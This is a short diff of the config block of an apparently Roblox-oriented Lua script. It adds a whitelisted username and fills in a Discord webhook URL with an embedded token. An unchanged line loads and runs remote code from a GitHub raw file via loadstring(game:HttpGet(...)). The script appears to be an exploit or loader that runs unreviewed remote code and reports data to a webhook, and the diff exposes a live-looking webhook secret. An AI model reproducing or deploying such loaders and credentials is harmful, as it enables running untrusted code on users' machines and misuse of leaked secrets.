@@ -1,13 +1,13 @@
 -- [[ 1. CONFIG ]]
 local WhitelistedNames = {
     "6SCRIPTERRR7",
-    " ",  
+    "PRIMOBNS21",  
     " ",
     " ",
 }
 
 local MainScript = "loadstring(game:HttpGet("https://raw.githubusercontent.com/dezqpal/Boldtespayb-/refs/heads/main/PRM%20paid.v1"))() "
-local WebhookURL = " webhook link mo "
+local WebhookURL = "https://discord.com/api/webhooks/1471444039269093492/TXAlu-WePcGR6NAVDQbk0vCg9EtHTSqF9eMiaKPT5nyTqqbFonvBN6cUTL3KpwJCZr3k "
 -- [[ 2. FORMATTER FUNCTION ]]
 local function FormatNumber(value)
     if not value or value == "N/A" then return "0" end
